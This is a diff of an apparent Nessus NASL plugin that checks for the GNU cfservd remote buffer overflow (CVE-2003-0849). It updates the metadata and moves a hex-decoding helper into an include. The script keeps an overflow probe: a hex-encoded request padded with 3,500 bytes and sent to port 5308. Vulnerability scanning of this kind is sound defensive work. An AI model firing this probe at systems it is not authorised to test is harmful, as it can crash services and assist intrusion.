@@ -4,9 +4,9 @@
 if(description)
 {
  script_id(11893);
- script_version("$Revision: 1.1 $");
- script_cve_id("CAN-2003-0849");
  script_bugtraq_id(8699);
+ script_version("$Revision: 1.6 $");
+ script_cve_id("CVE-2003-0849");
 
  name["english"] = "Gnu Cfserv remote buffer overflow";
 
@@ -20,7 +20,7 @@ this host, with the privileges cfservd is running with.
   
 Solution : upgrade to version 2.0.8/2.0.8p1
 See also : http://www.iu.hio.no/cfengine/
-Risk Factor : High";
+Risk factor : High";
 
  script_description(english:desc["english"]);
 
@@ -42,36 +42,14 @@ Risk Factor : High";
 
 # start script code
 
-
-function hex2raw(s)
-{
- local_var i, j, ret;
-
- for(i=0;i<strlen(s);i+=2)
- {
-  if(ord(s[i]) >= ord("0") && ord(s[i]) <= ord("9"))
-        j = int(s[i]);
-  else
-        j = int((ord(s[i]) - ord("a")) + 10);
-
-  j *= 16;
-  if(ord(s[i+1]) >= ord("0") && ord(s[i+1]) <= ord("9"))
-        j += int(s[i+1]);
-  else
-        j += int((ord(s[i+1]) - ord("a")) + 10);
-  ret += raw_string(j);
- }
- return ret;
-}
-
-
+include("misc_func.inc");
 
 port = 5308;
 if (!get_port_state(port)) exit(0);
 
 
 
-req = hex2raw(s:"32647564656475646564756465647564656475646509322F6173646661736466617464666173646661736466433A5C096C6F63616C686F73742E6C6F63616C646F6D61696E2E636F6D093730092D0D0A2E0D0A");                         
+req = hex2raw(s: tolower("32647564656475646564756465647564656475646509322F6173646661736466617464666173646661736466433A5C096C6F63616C686F73742E6C6F63616C646F6D61696E2E636F6D093730092D0D0A2E0D0A"));                         
 req += crap(3500);
 
 
